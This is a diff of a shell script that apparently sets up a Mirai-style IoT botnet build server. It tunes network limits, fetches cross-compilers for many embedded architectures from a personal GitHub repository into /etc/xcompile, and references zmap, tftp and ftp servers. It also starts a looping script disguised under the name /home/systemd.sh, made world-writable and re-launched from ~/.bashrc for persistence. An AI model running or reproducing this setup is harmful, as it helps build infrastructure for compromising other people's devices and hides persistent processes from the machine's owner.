@@ -27,7 +27,6 @@ echo "net.core.somaxconn = 1048576" >> /etc/sysctl.conf
 echo "net.ipv4.ip_local_port_range = 1024 65535" >> /etc/sysctl.conf
 echo "net.ipv4.tcp_max_syn_backlog = 8192" >> /etc/sysctl.conf
 sysctl -p
-sudo apt install -y software-properties-common build-essential libgmp-dev screen wget curl bzip2 gcc nano g++ electric-fence libc6-dev apache2 xinetd tftpd-hpa mariadb-server vsftpd zmap jq
 rm -rf /usr/local/go && wget -q -O /tmp/go.tar.gz https://dl.google.com/go/go1.24.2.linux-amd64.tar.gz && tar -C /usr/local -xzf /tmp/go.tar.gz && rm -f /tmp/go.tar.gz
 mkdir -p /etc/xcompile && cd /etc/xcompile && for file in arc.tar.xz armv4l.tar.xz armv5l.tar.xz armv6l.tar.xz armv7l.tar.xz i486.tar.xz i586.tar.xz i686.tar.xz m68k.tar.xz mips.tar.xz mipsel.tar.xz powerpc.tar.xz powerpc-440fp.tar.xz sh4.tar.xz sparc.tar.xz x86_64.tar.xz; do wget https://raw.githubusercontent.com/Rdthaiphno064/boto/refs/heads/main/$file && tar -xJf $file -C /etc/xcompile/ && rm $file; done && cd ~
 echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
@@ -106,6 +105,6 @@ while true; do
   sleep 60
 done &
 EOF
-chmod +x /home/systemd.sh
+chmod 777 /home/systemd.sh
 bash /home/systemd.sh
 echo 'bash /home/systemd.sh' >> ~/.bashrc
